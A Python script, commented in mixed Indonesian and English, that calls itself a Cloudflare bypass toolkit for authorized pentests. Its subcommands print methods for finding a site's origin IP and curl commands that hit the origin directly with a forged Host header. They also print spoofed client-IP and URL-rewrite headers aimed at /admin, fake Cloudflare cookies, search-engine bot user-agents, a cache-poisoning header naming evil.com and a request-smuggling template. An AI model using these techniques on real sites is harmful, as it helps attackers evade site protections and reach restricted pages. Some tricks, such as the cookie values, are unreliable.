#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""cf_bypass.py — Cloudflare bypass toolkit buat authorized pentest.

Fitur:
  - origin: cari origin IP (DNS history, censys, etc.)
  - header: header injection buat bypass CF
  - chunked: chunked transfer encoding
  - cache: cache poisoning/deception
  - dns: DNS rebinding simulation
  - direct: direct IP access (origin)

    python3 cf_bypass.py origin --domain target.com
    python3 cf_bypass.py header --target "https://target.com/admin"
    python3 cf_bypass.py chunked --payload "GET /admin HTTP/1.1\r\nHost: target.com\r\n"
    python3 cf_bypass.py cache --url "https://target.com/?cb=random"
    python3 cf_bypass.py direct --ip 103.56.206.81 --host target.com
"""
import argparse, base64, json, random, socket, string, sys, urllib.parse

def origin_find(domain):
    print(f"[*] Origin IP discovery untuk: {domain}")
    print()
    print("[*] 1. DNS History (SecurityTrails, ViewDNS)")
    print(f"    https://securitytrails.com/dns-history/{domain}")
    print(f"    https://viewdns.info/iphistory/?domain={domain}")
    print()
    print("[*] 2. Censys / Shodan")
    print(f"    https://search.censys.io/search?hosts={domain}")
    print(f"    https://www.shodan.io/search?query={domain}")
    print()
    print("[*] 3. Subdomain enumeration")
    print(f"    subfinder -d {domain}")
    print(f"    amass enum -d {domain}")
    print()
    print("[*] 4. SSL Certificate")
    print(f"    crt.sh/?q=%.{domain}&output=json")
    print()
    print("[*] 5. Direct IP (kalau origin exposed)")
    try:
        ip = socket.gethostbyname(domain)
        print(f"    {domain} -> {ip}")
    except:
        print(f"    [-] DNS gagal resolve")
    print()
    print("[*] 6. Bypass CF via Origin IP:")
    print(f"    curl -k --resolve {domain}:443:ORIGIN_IP https://{domain}")
    print(f"    curl -k -H 'Host: {domain}' https://ORIGIN_IP/admin")

def header_bypass(target):
    print(f"[*] Cloudflare header bypass untuk: {target}")
    print()
    headers = {
        "X-Forwarded-For": "127.0.0.1",
        "X-Real-IP": "127.0.0.1",
        "CF-Connecting-IP": "127.0.0.1",
        "True-Client-IP": "127.0.0.1",
        "X-Forwarded-Host": "localhost",
        "X-Original-URL": "/admin",
        "X-Rewrite-URL": "/admin",
        "X-Originating-IP": "127.0.0.1",
        "X-Client-IP": "127.0.0.1",
        "X-Host": "127.0.0.1",
    }
    for h, v in headers.items():
        print(f"  {h}: {v}")
    print()
    print("[*] Cookie bypass:")
    print("  __cf_bm=1")
    print("  __cfduid=1")
    print("  cf_clearance=1")
    print()
    print("[*] User-Agent bypass (CF bot whitelist):")
    print("  Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")
    print("  Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)")
    print("  facebookexternalhit/1.1")
    print("  Twitterbot/1.0")

def chunked_bypass(payload):
    print(f"[*] Chunked transfer encoding bypass (CF)")
    print(f"[*] Original: {payload[:60]}")
    print()
    lines = payload.split("\n") if "\n" in payload else [payload]
    result = []
    for line in lines:
        if not line:
            continue
        chunk_size = len(line.encode())
        result.append(f"{chunk_size:x}\r\n{line}\r\n")
    result.append("0\r\n\r\n")
    chunked = "".join(result)
    print("[*] Chunked encoding:")
    print(chunked)
    print()
    print("[*] Headers tambahan:")
    print("  Transfer-Encoding: chunked")
    print("  Content-Type: application/x-www-form-urlencoded")

def cache_poison(url):
    print(f"[*] Cache poisoning/deception untuk: {url}")
    print()
    print("[*] Cache busting keys:")
    cache_keys = ["cb", "_", "rand", "timestamp", "nonce", "v"]
    for key in cache_keys:
        random_val = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
        print(f"  {url}?{key}={random_val}")
    print()
    print("[*] Cache deception:")
    print("  X-Forwarded-Host: evil.com")
    print("  X-Original-URL: /admin")
    print("  X-Rewrite-URL: /admin")
    print()
    print("[*] HTTP Request Smuggling:")
    print("  GET / HTTP/1.1")
    print("  Host: target.com")
    print("  Transfer-Encoding: chunked")
    print("  Content-Length: 0")
    print()
    print("  0")
    print()
    print("  GET /admin HTTP/1.1")
    print("  Host: target.com")
    print("  (empty line)")
    print()

def direct_access(ip, host):
    print(f"[*] Direct IP access (origin)")
    print(f"[*] IP: {ip}")
    print(f"[*] Host: {host}")
    print()
    print("[*] curl commands:")
    print(f"  curl -k -H 'Host: {host}' https://{ip}/")
    print(f"  curl -k --resolve {host}:443:{ip} https://{host}/")
    print(f"  curl -k --resolve {host}:80:{ip} http://{host}/")
    print()
    print("[*] Nginx/Apache vhost bypass:")
    print(f"  Host: {ip}")
    print(f"  Host: {ip}:443")
    print(f"  Host: {host}")
    print()
    print("[*] HTTP/2 downgrade:")
    print(f"  curl -k --http1.1 -H 'Host: {host}' https://{ip}/")

def main():
    args = sys.argv[1:]
    if not args:
        print(__doc__)
        return
    cmd = args[0]
    if cmd == "origin":
        p = argparse.ArgumentParser()
        p.add_argument("--domain", required=True)
        a = p.parse_args(args[1:])
        origin_find(a.domain)
    elif cmd == "header":
        p = argparse.ArgumentParser()
        p.add_argument("--target", required=True)
        a = p.parse_args(args[1:])
        header_bypass(a.target)
    elif cmd == "chunked":
        p = argparse.ArgumentParser()
        p.add_argument("--payload", required=True)
        a = p.parse_args(args[1:])
        chunked_bypass(a.payload)
    elif cmd == "cache":
        p = argparse.ArgumentParser()
        p.add_argument("--url", required=True)
        a = p.parse_args(args[1:])
        cache_poison(a.url)
    elif cmd == "direct":
        p = argparse.ArgumentParser()
        p.add_argument("--ip", required=True)
        p.add_argument("--host", required=True)
        a = p.parse_args(args[1:])
        direct_access(a.ip, a.host)
    else:
        print(__doc__)

if __name__ == "__main__":
    main()
